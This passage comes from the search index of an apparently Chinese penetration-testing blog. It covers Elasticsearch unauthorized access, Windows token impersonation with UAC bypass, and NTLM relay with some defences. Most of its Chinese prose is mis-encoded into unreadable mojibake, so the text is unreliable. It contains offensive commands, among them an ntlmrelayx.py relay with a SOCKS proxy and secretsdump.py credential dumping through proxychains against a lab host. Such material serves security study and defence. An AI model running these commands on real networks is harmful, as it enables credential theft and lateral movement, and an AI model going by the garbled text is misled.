","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Elasticsearch ç®€ä»‹ Elasticsearch æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ã€é«˜æ‰©å±•ã€é«˜å®æ—¶çš„æœç´¢ä¸æ•°æ®åˆ†æå¼•æ“ã€‚å®ƒèƒ½å¾ˆæ–¹ä¾¿çš„ä½¿å¤§é‡æ•°æ®å…·æœ‰æœç´¢ã€åˆ†æå’Œæ¢ç´¢çš„èƒ½åŠ›ã€‚å……åˆ†åˆ©ç”¨ Elasticsearch çš„æ°´å¹³ä¼¸ç¼©æ€§ï¼Œèƒ½ä½¿æ•°æ®åœ¨ç”Ÿäº§ç¯å¢ƒå˜å¾—æ›´æœ‰ä»·å€¼ã€‚ Elasticsearch çš„å®ç°åŸç†ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼Œé¦–å…ˆç”¨æˆ·å°†æ•°æ®æäº¤åˆ° Elasticsearch æ•°æ®åº“ä¸­ï¼Œå†é€šè¿‡åˆ†è¯æ§åˆ¶å™¨å»å°†å¯¹åº”çš„è¯­å¥åˆ†è¯ï¼Œå°†å…¶æƒé‡å’Œåˆ†è¯ç»“æœä¸€å¹¶å­˜å…¥æ•°æ®ï¼Œå½“ç”¨æˆ·æœç´¢æ•°æ®æ—¶å€™ï¼Œå†æ ¹æ®æƒé‡å°†ç»“æœæ’åï¼Œæ‰“åˆ†ï¼Œå†å°†è¿”å›ç»“æœå‘ˆç°ç»™ç”¨æˆ·ã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Elasticsearch æœªæˆæƒè®¿é—®æ¼æ´ Elasticsearch æ˜¯ java ç¼–å†™çš„ä¼ä¸šçº§æœç´¢æœåŠ¡ï¼Œå¯åŠ¨æ­¤æœåŠ¡é»˜è®¤ä¼šå¼€æ”¾ HTTP 9200 ç«¯å£ï¼Œå¯è¢«éæ³•æ“ä½œæ•°æ®ã€‚ nmap -sV -p 9200 IP http://IP:9200/ http://IP:9200/_nodes æŸ¥çœ‹èŠ‚ç‚¹æ•°æ® http://IP:9200/_cat é»˜è®¤å¼€å¯çš„ 9200 ç«¯å£å’Œä½¿ç”¨çš„ç«¯å£ä¸å¯¹å¤–å…¬å¸ƒï¼Œæˆ–æ¶è®¾å†…ç½‘ç¯å¢ƒã€‚æˆ–è€…é˜²ç«å¢™ä¸Šè®¾ç½®ç¦æ­¢å¤–ç½‘è®¿é—® 9200 ç«¯å£ä¸º elasticsearch å¢åŠ ç™»å½•éªŒè¯ï¼Œå¯ä»¥ä½¿ç”¨å®˜æ–¹æ¨èçš„shield æ’ä»¶ï¼Œè¯¥æ’ä»¶ä¸ºæ”¶è´¹æ’ä»¶ï¼Œå¯è¯•ç”¨ 30 å¤©ï¼Œå…è´¹çš„å¯ä»¥ä½¿ç”¨ elasticsearch-http-basicï¼Œsearchquard æ’ä»¶ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"CVE-2014-3120 https://geekby.xyz/2019/06/08/elasticsearch-ming-ling-zhi-xing-lou-dong/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"CVE-2015-1427 https://geekby.xyz/2019/06/08/elasticsearch-groovy-sha-he-rao-guo/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:4","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"CVE-2015-3337 https://geekby.xyz/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:5","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"CVE-2015-5531 https://geekby.xyz/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong-1/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:6","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡» ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Token ç®€ä»‹ ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Token æ¦‚å¿µ å¾®è½¯å®˜æ–¹çš„å®šä¹‰å¦‚ä¸‹ï¼š An access token is an object that describes the security context of a process or thread.The information in token includes the identity and privileges of the user account associatedwith the process or thread. Windows Access Token(è®¿é—®ä»¤ç‰Œ)ï¼Œå®ƒæ˜¯ä¸€ä¸ªæè¿°è¿›ç¨‹æˆ–è€…çº¿ç¨‹å®‰å…¨ä¸Šä¸‹æ–‡çš„ä¸€ä¸ªå¯¹è±¡ã€‚ä¸åŒçš„ç”¨æˆ·ç™»å½•è®¡ç®—æœºåï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ª Access Tokenï¼Œè¿™ä¸ª Token åœ¨ç”¨æˆ·åˆ›å»ºè¿›ç¨‹æˆ–è€…çº¿ç¨‹æ—¶ä¼šè¢«ä½¿ç”¨ï¼Œä¸æ–­çš„æ‹·è´ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº† A ç”¨æˆ·åˆ›å»ºä¸€ä¸ªè¿›ç¨‹è€Œè¯¥è¿›ç¨‹æ²¡æœ‰ B ç”¨æˆ·çš„æƒé™ã€‚å½“ç”¨æˆ·æ³¨é”€åï¼Œç³»ç»Ÿå°†ä¼šä½¿ä¸»ä»¤ç‰Œåˆ‡æ¢ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œï¼Œä¸ä¼šå°†ä»¤ç‰Œæ¸…é™¤ï¼Œåªæœ‰åœ¨é‡å¯æœºå™¨åæ‰ä¼šæ¸…é™¤ã€‚ Access Token åˆ†ä¸ºä¸¤ç§(ä¸»ä»¤ç‰Œã€æ¨¡æ‹Ÿä»¤ç‰Œ) ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Token åˆ†ç±» 1ã€primary token è¿™ç§ä»¤ç‰Œé€šå¸¸ç”¨äºæœ¬åœ°åŠè¿œç¨‹ RDP ç™»å½• 2ã€impersonation token è¿™ç§åˆ™é€šå¸¸ç”¨äºå„ç§éäº¤äº’å¼çš„ç™»å½•ï¼Œæ¯”å¦‚ï¼Œnetuseï¼Œwmiï¼Œwinrmç­‰ç­‰ ç™»å½•æ–¹å¼ äº¤äº’å¼ç™»å½• console login (type 2) rdp login (type 10) psexec (type 2) ç½‘ç»œç™»å½• wmi (type 3) winrm (type 3) ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Token ç»„æˆ ç”¨æˆ·å¸æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦(SID) ç”¨æˆ·æ‰€å±çš„ç»„çš„ SID ç”¨äºæ ‡è¯†å½“å‰ç™»å½•ä¼šè¯çš„ç™»å½• SID ç”¨æˆ·æˆ–ç”¨æˆ·ç»„æ‰€æ‹¥æœ‰çš„æƒé™åˆ—è¡¨ æ‰€æœ‰è€… SID ä¸»è¦ç»„çš„ SID è®¿é—®æ§åˆ¶åˆ—è¡¨ è®¿é—®ä»¤ç‰Œçš„æ¥æº ä»¤ç‰Œæ˜¯ä¸»è¦ä»¤ç‰Œè¿˜æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œ é™åˆ¶ SID çš„å¯é€‰åˆ—è¡¨ ç›®å‰çš„æ¨¡æ‹Ÿç­‰çº§ å…¶ä»–ç»Ÿè®¡æ•°æ® ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å…³äº SID å®‰å…¨æ ‡è¯†ç¬¦(Security identifiers)ï¼Œç®€ç§°ä¸º SIDï¼Œåˆ†åˆ«æ˜¯ OwnerSid å’Œ GroupSidã€‚æ‰€è°“ SID å°±æ˜¯æ¯æ¬¡å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç”¨æˆ·æˆ–ä¸€ä¸ªç»„çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šåˆ†é…ç»™è¯¥ç”¨æˆ·æˆ–ç»„ä¸€ä¸ªå”¯ä¸€ SIDï¼Œå½“ä½ é‡æ–°å®‰è£…ç³»ç»Ÿåï¼Œä¹Ÿä¼šå¾—åˆ°ä¸€ä¸ªå”¯ä¸€çš„ SIDã€‚SID æ˜¯å”¯ä¸€çš„ï¼Œä¸éšç”¨æˆ·çš„åˆ é™¤è€Œåˆ†é…åˆ°å¦å¤–çš„ç”¨æˆ·ä½¿ç”¨ã€‚è¯·è®°ä½ï¼ŒSID æ°¸è¿œéƒ½æ˜¯å”¯ä¸€çš„ã€‚SIF æ˜¯ç”±è®¡ç®—æœºåã€å½“å‰æ—¶é—´ã€å½“å‰ç”¨æˆ·æ€çº¿ç¨‹çš„ CPU è€—è´¹æ—¶é—´çš„æ€»å’Œä¸‰ä¸ªå‚æ•°å†³å®šä»¥ä¿è¯å®ƒçš„å”¯ä¸€æ€§ã€‚ ä¾‹ï¼šS-1-5-21-1763234323-321265751-1234321321-500(whoami/user) ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Token äº§ç”Ÿè¿‡ç¨‹ ç”¨æˆ·ä½¿ç”¨å‡­æ®(ç”¨æˆ·å¯†ç )è¿›è¡Œè®¤è¯ â€“\u003e ç™»å½• session åˆ›å»º â€“\u003e windows è¿”å›ç”¨æˆ·çš„ sid å’Œç”¨æˆ·æ‰€åœ¨ç»„çš„ sid â€“\u003e LSA åˆ›å»ºä¸€ä¸ª Access token â€”\u003e ä½¿ç”¨å‡­æ®æˆåŠŸè®¤è¯ â€“\u003e ç™»å½• session â€”\u003e token â€”\u003e è¿›ç¨‹ã€çº¿ç¨‹ ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åæ¸—é€ä¸­çš„ä»¤ç‰Œæ¨¡æ‹Ÿ ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"cobalt strike æ¨¡æ‹Ÿä»¤ç‰Œ ä½¿ç”¨ steal_token æ¨¡æ‹Ÿä»¤ç‰Œï¼Œrev2self æ¢å¤ä»¤ç‰Œ ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"metasploit æ¨¡æ‹Ÿä»¤ç‰Œ incognito æ¨¡å—ï¼ŒåŒæ · rev2self æ¢å¤ä»¤ç‰Œ ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è·å–ä»»æ„è¿›ç¨‹çš„ä»¤ç‰Œæƒé™ ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ‰‹åŠ¨ä»¤ç‰Œæ¨¡æ‹Ÿ æ¨¡æ‹Ÿè¿‡ç¨‹ï¼š openprocess() â€“\u003e openprocesstoken() â€“\u003e impersonateloggedonuser() â€“\u003e duplicatetokenex() â€“\u003e createprocesswithtokenw() openprocess openprocesstoken impersonateloggedonuser duplicatetokenex createprocesswithtokenw ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Bypass Protect Process å¹¶ä¸æ˜¯æ‰€æœ‰çš„è¿›ç¨‹éƒ½æ˜¯å¯ä»¥è¢«æ“ä½œçš„ åªè·å– system æƒé™çš„è¿›ç¨‹: get-token where-object {$_.username-eq 'NT AUTHORITY\\SYSTEM' -and $_ownername -ne 'NT AUTHORITY\\SYSTEM'} | select-object processname, processsid | format-table ç„¶åç»è¿‡æµ‹è¯•å‘ç°åƒ csrssã€ serviceã€ wininitã€smss ç­‰ token è·å–å¤±è´¥ã€‚ ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:3:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä½¿ç”¨ Access Token è¿›è¡Œ BypassUAC Fuzzy Security åˆ©ç”¨ Windows ä»¤ç‰Œå®ç° UAC ç»•è¿‡ https://github.com/fuzzysecurity/powershell-suit/blob/master/UAC-TokenMagic.ps1 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","Access Token"],"title":"åŸŸæ¸—é€ä¹‹ Windows Access Token æ”»å‡»","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"NTLM ä¸­é—´äººæ”»å‡»åŸç†åŠå®éªŒ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"NTLM Relay ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 å‰è¨€ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 èƒŒæ™¯ä»‹ç» NTLM Relayï¼Œä¸­é—´äººæ”»å‡»æˆ–é‡æ”¾æ”»å‡»æ˜¯ä¸€ä¸ªæ„æ€ã€‚ B æ˜¯ä¸€ä¸ª smb æœåŠ¡å™¨ï¼ŒA æ¥è¿›è¡Œè®¤è¯ï¼ŒB å°† A çš„è®¤è¯ä¿¡æ¯è½¬å‘åˆ° C ä¸Šï¼Œå¦‚æœ A çš„å‡­è¯åœ¨ C ä¸Šè®¤è¯æˆåŠŸå°±èƒ½è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œå¦‚åˆ›å»ºæœåŠ¡æ‰§è¡Œå‘½ä»¤ã€‚å¦‚æœåœ¨åŸŸä¸­æ§åˆ¶äº†æŸäº›å¸¸ç”¨æœåŠ¡ï¼Œå¦‚ï¼šWEB OA ç³»ç»Ÿã€æ–‡ä»¶å…±äº«ç­‰æœåŠ¡åˆ™å¯ä»¥å°è¯•ä½¿ç”¨ SMB ä¸­ç»§æ”»å‡»æ¥å¼•è¯±åŸŸç®¡ç†å‘˜è®¿é—®è¾¾åˆ°è·å–å…¶ä»–æœºå™¨æƒé™çš„ç›®çš„ã€‚ 2001 å¹´ï¼Œæœ€æ—©ç”± Dystic å®ç°ï¼ŒSMBRelay 2004 å¹´ï¼Œå‘å±•ä¸º HTTP -\u003e SMBï¼ŒBlackHatï¼Œæœªå¼€æº 2007 å¹´ï¼ŒHTTP -\u003e SMB è¢«é›†æˆåˆ° MetaSploit 2008 å¹´ï¼ŒHTTP -\u003e HTTPçš„ NTLM æ”»å‡»è¢«å®ç°(MS08-067) ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 è®¤è¯è¿‡ç¨‹ ä¸¤ç«¯æ¨¡å‹ï¼š ä¸‰ç«¯æ¨¡å‹ï¼š åœ¨åŸŸç¯å¢ƒä¸‹çš„ NTLM Relay çš„æ¨¡å‹ï¼š ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.3 HTTP -\u003e SMB æ”»å‡»å®éªŒ 1.3.1 nmap æ¢æµ‹ SMB ç­¾å nmap æ‰«æï¼š nmap -p445 --script=smb-security-mode.nse IP --open 1.3.2 ä½¿ç”¨ ntmlrelayx.py æµ‹è¯• ntmlrelayx.py è„šæœ¬åœ¨ empire åŒ…ä¸­ ntlmrelayx.py -tf hosts.txt -socks -smb2support æ³¨æ„ å‘èµ·æ”»å‡»æ—¶ï¼ŒHTTP -\u003e SMBï¼Œå¼€å¯ 80 ç«¯å£ï¼Œéœ€è¦ä¿è¯ç«¯å£æœªè¢«å ç”¨ æ”»å‡»æˆåŠŸåï¼Œä¼šåœ¨æ”»å‡»æœºæœ¬åœ°å¼€å¯ 1080 socks ç«¯å£ï¼Œé€šè¿‡ proxychain ç­‰ä»£ç†å·¥å…·ï¼Œå³å¯æ§åˆ¶ç›®æ ‡æœºå™¨ã€‚ # mac ä¸‹ proxychain-NG proxychains4 /Users/Geekby/opt/anaconda3/bin/python secretsdump.py pentest.com/Administrator@172.16.147.132 æ³¨æ„ è¿›è¡Œè®¤è¯æ—¶ä¼šæç¤ºè¾“å…¥å¯†ç ï¼Œç•™ç©ºå³å¯ä½¿ç”¨ relay åçš„å‡­æ®è¿›è¡Œè®¤è¯ã€‚ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.4 Hot Potato Hot Potato æ˜¯ä¸€ä¸ªç»å…¸çš„åˆ©ç”¨ NTLM Relay è·å–é«˜æƒé™ç”¨æˆ·æ§åˆ¶æƒçš„ä¾‹å­ï¼Œå¯ä»¥å‚è€ƒã€ŒPotato å®¶æ—ææƒåˆ†æã€è¿™ç¯‡æ–‡ç« ã€‚ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.5 NTLM Relay é˜²å¾¡ ç›®å‰æœ‰è®¸å¤šé’ˆå¯¹ NTLM é‡æ”¾æ”»å‡»çš„é˜²å¾¡æªæ–½ï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ç§ï¼š SMB \u0026 LDAP ç­¾å EAP (Enhanced Protection Authentication) LDAPS Channels Server target SPN Validation 1.5.1 SMB \u0026 LDAP ç­¾å å®Œæˆè®¤è¯åï¼Œåº”ç”¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„æ‰€æœ‰æµé‡éƒ½æœ‰ç­¾åéªŒè¯ä¿æŠ¤ï¼›ç”¨æˆ·ç­¾åçš„ä¼šè¯å¯†é’¥åŸºäºå®¢æˆ·ç«¯çš„ NTLM å€¼ç”Ÿæˆï¼Œåº”ç”¨æœåŠ¡å™¨åœ¨ NETLOGON é˜¶æ®µä» DC æœåŠ¡å™¨è·å–ï¼›å®¢æˆ·ç«¯é‡‡ç”¨å’Œ DC ç›¸åŒçš„ç®—æ³•ï¼ŒåŸºäºè‡ªèº«çš„ NTLM å€¼ç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œå› æ­¤ä¸­é—´äººæ”»å‡»æ²¡æœ‰åŠæ³•è·å–ä¼šè¯å¯†é’¥ 1.5.2 EAP (Enhanced Protection Authentication) NTLM 